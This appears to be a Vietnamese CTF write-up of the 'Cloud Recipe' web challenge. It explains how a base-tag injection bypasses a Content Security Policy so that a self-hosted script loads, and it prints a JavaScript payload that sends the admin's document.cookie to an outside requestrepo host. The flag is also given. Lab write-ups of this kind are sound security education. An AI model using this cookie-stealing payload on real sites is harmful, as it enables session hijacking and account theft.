---
layout: default
title: "Cloud Recipe"
date: 2025-04-03 16:50:38 +0700
tags: [CTF, Kind4SUS CTF]
---
# Cloud Recipe - web
> Author: tan3ora

- Tên: Cloud Recipe
- Description: Cloud Recipe is the first website entirely dedicated to keeping your secret recipes safe! Even Nuka Cola trusts us!
- Link: http://chall.ctf.k1nd4sus.it:31000/
- *Có source code*
---
## Phân tích
Trang web có chức năng tạo recipe để lưu trữ và có thể gửi cho admin.
Mục tiêu là bypass được CSP để khai thác XSS lấy cookie của admin.

Check CSP ta có ![](https://)![](http://note.bksec.vn/pad/uploads/521d10ae-0bfa-4e9a-bb78-a16bf4ce94d9.png)

Ở đây có thể nghĩ đến 2 hướng : tập trung vào `default-src` hoặc `base-uri`. Do trong CSP đã có `style-src`  nên với việc cần khai thác XSS,miss `default-src` cũng không ảnh hưởng nhiều lắm.

Tập trung vào hướng `base-uri`,phân tích source code đã cho,phát hiện server dùng đường dẫn tương đối để nhúng file `js` ![](https://)![](http://note.bksec.vn/pad/uploads/6b483b1a-93d3-4db8-8d1c-56d01ed6a248.png)
Từ đây có thể chèn url ta tự host qua `<base>` vào phần `<head>` để nhúng file `js` của ta  vào và chạy payload `javascript`.

## Khai thác
Dùng [requestrepo](https://requestrepo.com/) để host file payload tại `/static/js/image.js` :
```javascript=
var cookieValue = document.cookie;
fetch("https://1e5qhv69.requestrepo.com?flag=" + encodeURIComponent(cookieValue), {
    method: "GET"
})
```
![](https://)![](http://note.bksec.vn/pad/uploads/6f7f23ad-8b25-40cf-9889-8cf8f4bffb8f.png)

Chèn `base-uri` qua thẻ meta và gửi cho admin:
![](https://)![](http://note.bksec.vn/pad/uploads/31caff02-6d6d-47bf-b382-3b9aa04f9180.png)

Decode để lấy flag:
![](https://)![](http://note.bksec.vn/pad/uploads/e4f1f304-bd26-41d3-896c-6d30f4c5a09e.png)

Flag: `KSUS{0h_n0_m4_l4546n4_r3c1p3}`


